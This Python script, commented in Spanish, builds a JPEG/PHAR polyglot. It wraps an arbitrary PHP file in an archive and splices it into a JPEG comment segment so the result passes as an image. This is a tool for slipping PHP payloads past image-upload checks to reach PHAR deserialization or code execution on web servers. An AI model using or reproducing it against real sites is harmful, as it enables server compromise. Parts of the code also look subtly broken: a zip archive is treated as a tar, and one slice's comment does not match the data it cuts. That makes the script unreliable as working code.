import struct
import os

from zipfile import ZipFile


def generate_base_phar(php_file):
    tempname = 'temp.tar.phar'  # Archivo temporal para el PHAR
    # Eliminar archivo temporal si ya existe
    try:
        os.remove(tempname)  
    except FileNotFoundError:
        pass

    # Leer el archivo PHP que queremos incluir en el PHAR
    with open(php_file, 'r') as php_file_content:
        php_code = php_file_content.read()

        if len(php_code) > 65480:
            raise ValueError("The PHP code is too long to be included in a PHAR. The maximum size is 65,480 bytes.")

        start_code = '''<?php
echo "\n";
?>'''

        end_code = '''<?php
exit(0);
__HALT_COMPILER();
?>'''
        php_code = start_code + php_code + end_code

    # Se utiliza la librería ZipFile para crear el PHAR
    with ZipFile(tempname, 'w') as phar:
        # Añadir el archivo PHP al PHAR
        phar.writestr(php_file, php_code)

    with open(tempname, 'rb') as temp_file:
        basecontent = temp_file.read()

    os.remove(tempname)  # Eliminar archivo temporal PHAR
    return basecontent


def merge_jpeg_php(jpeg_file: str, php_file: str, output_file: str, verbose: bool = False):

    # Leer el archivo JPEG
    with open(jpeg_file, 'rb') as f:
        jpeg_data = f.read()
    if verbose:
        print('Generating PHAR from PHP file...')

    # Crear el archivo polyglot a partir del archivo PHP 
    phar_data = generate_base_phar( php_file)
    if verbose:
        print('PHAR data generated successfully.')
        print(f'PHAR data length: {len(phar_data)} bytes')
        print('PHAR data: ')
        print(phar_data)
        print('\n')
    
    # se crea el polyglot a partir de phar_data y jpeg_data
    phar_data = phar_data[6:]  # Eliminar '<?php' porque no funciona con el prefijo
    phar_len = len(phar_data) + 2  # Longitud corregida
    
    # Crear el nuevo archivo polyglot
    new_data = jpeg_data[:2] + b'\xff\xfe' + struct.pack('>H', phar_len) + phar_data + jpeg_data[2:]
    
    # Calcular el checksum para el tar
    checksum = sum(new_data[:512])  # Solo los primeros 512 bytes son relevantes para el checksum
    octal_checksum = format(checksum, '07o')
    if verbose:
        print(f'Checksum: {octal_checksum}')
    # Incluir el checksum
    polyglot_data = new_data[:148] + octal_checksum.encode() + new_data[155:]
    
    if verbose:
        print(f'Polyglot file length: {len(polyglot_data)} bytes')
    
    # Guardar el archivo de salida
    with open(output_file, 'wb') as f:
        f.write(polyglot_data)
